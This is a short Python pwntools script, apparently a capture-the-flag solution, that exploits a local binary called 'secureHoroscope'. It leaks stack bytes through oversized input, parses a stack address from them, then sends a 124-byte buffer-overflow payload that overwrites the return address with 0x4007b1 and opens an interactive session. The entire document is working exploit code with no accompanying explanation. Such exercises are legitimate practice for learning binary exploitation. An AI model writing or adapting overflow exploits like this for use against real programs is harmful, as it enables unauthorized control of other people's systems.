from pwn import *
import base64
e = context.binary = ELF('./secureHoroscope')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./secureHoroscope')

gdb.attach(p)

p.sendline('a'*40)
print p.recvuntil("feel")
print p.recvuntil("we will have your very own horoscope")
p.sendline('a'*99)
a = p.recvline()
p.recvline()
b = p.recv(98)
print('a' + b)
x = p.recv(8)
cat= ''
for i in bytearray(x)[::-1]:
	if i =="0xa":continue
	print hex(i)
	cat+=(hex(i)[2:])
y = int("0x"+cat[1:13],16)-184
print "y: " + hex(y) #parse stack address
payload = 'a'*124+p64(0x0000000004007b1)
p.sendline(payload)
p.interactive()
